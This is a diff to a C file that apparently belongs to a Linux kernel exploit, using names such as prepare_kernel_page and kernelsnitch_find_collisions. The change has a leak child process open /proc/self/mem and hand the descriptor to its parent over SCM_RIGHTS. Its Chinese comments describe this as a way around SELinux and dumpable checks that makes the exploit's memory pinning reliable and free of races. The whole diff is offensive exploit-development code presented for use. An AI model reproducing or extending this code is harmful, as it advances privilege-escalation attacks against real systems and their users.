@@ -350,14 +350,87 @@ pid_t clone_child(void) {
   return child;
 }
 
+int g_leak_sock = -1; /* mt47-c: parent-side socket for SCM_RIGHTS fd (no CLOEXEC on received fd) */
+
 pid_t clone_leak_child(void) {
+  int sv[2];
+  int have_sock = (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) == 0);
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     alarm(60);  /* mt18-diag watchdog: leak child must not wedge forever */
+    if (have_sock) close(sv[0]);
+    /* mt47-c ★自开 pin★ open("/proc/self/mem") 走 mm==current->mm 捷径,
+     * 不查 SELinux/dumpable(反汇编 __ptrace_may_access@b9c 同 mm 短路;
+     * mm_access 亦有 mm==current->mm 直接返回), 结构性 100% 成功。
+     * fd 持 mm_count 引用(mem_release 反汇编: [file+0xd8]=mm, 原子减 [mm+0x58]),
+     * 经 SCM_RIGHTS 转移给父进程 → pin 语义与父进程 open /proc/pid/mem 完全等价,
+     * 且从出生即 pin, 消灭"EACCES 时序竞争"与"zombie 静默丢 pin"两个故障模式。 */
+    if (have_sock) {
+      int mfd = open("/proc/self/mem", O_RDONLY);
+      char ok = 0;
+      if (mfd >= 0) {
+        struct iovec iov = { .iov_base = &ok, .iov_len = 1 }; /* ok=1 via send below */
+        char cmb[CMSG_SPACE(sizeof(int))];
+        struct msghdr msg;
+        memset(&msg, 0, sizeof(msg));
+        msg.msg_iov = &iov;
+        msg.msg_iovlen = 1;
+        msg.msg_control = cmb;
+        msg.msg_controllen = sizeof(cmb);
+        struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+        cm->cmsg_level = SOL_SOCKET;
+        cm->cmsg_type = SCM_RIGHTS;
+        cm->cmsg_len = CMSG_LEN(sizeof(int));
+        memcpy(CMSG_DATA(cm), &mfd, sizeof(int));
+        ok = 1;
+        if (sendmsg(sv[1], &msg, 0) != 1) ok = 0;
+        close(mfd); /* 引用已随 cmsg 转移, 本地可关 */
+      }
+      if (!ok) {
+        char c = 0;
+        ssize_t w = write(sv[1], &c, 1);
+        (void)w;
+      }
+      close(sv[1]);
+    }
     kernelsnitch_find_collisions(ks);
     exit(0);
   }
+  if (have_sock) {
+    close(sv[1]);
+    g_leak_sock = sv[0];
+  }
   return child;
+}
+
+/* mt47-c: 在原 open_memfd(leak_child) 的调用点替换调用本函数。
+ * 阻塞毫秒级(子进程出生即 sendmsg), EOF/失败返回 -1 → 调用点 fallback 旧路径。 */
+int leak_memfd_recv(void) {
+  if (g_leak_sock < 0) return -1;
+  char c = 0;
+  struct iovec iov = { .iov_base = &c, .iov_len = 1 };
+  char cmb[CMSG_SPACE(sizeof(int))];
+  struct msghdr msg;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+  msg.msg_control = cmb;
+  msg.msg_controllen = sizeof(cmb);
+  ssize_t r = recvmsg(g_leak_sock, &msg, 0);
+  int fd = -1;
+  if (r == 1 && c == 1) {
+    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+    if (cm && cm->cmsg_level == SOL_SOCKET && cm->cmsg_type == SCM_RIGHTS &&
+        cm->cmsg_len >= CMSG_LEN(sizeof(int))) {
+      memcpy(&fd, CMSG_DATA(cm), sizeof(int));
+    }
+  }
+  close(g_leak_sock);
+  g_leak_sock = -1;
+  pr_info("mt47-c: leak pin via SCM_RIGHTS %s (fd=%d)\n",
+          fd >= 0 ? "OK" : "FAIL->fallback", fd);
+  fflush(stdout);
+  return fd;
 }
 
 int open_memfd(pid_t child) {
@@ -741,7 +814,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
-  memfd_leak = open_memfd(child_leak);
+  /* mt47-c: SCM_RIGHTS 自开 pin 优先, 失败回退旧路径(诊断埋点保留) */
+  memfd_leak = leak_memfd_recv();
+  if (memfd_leak < 0) memfd_leak = open_memfd(child_leak);
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
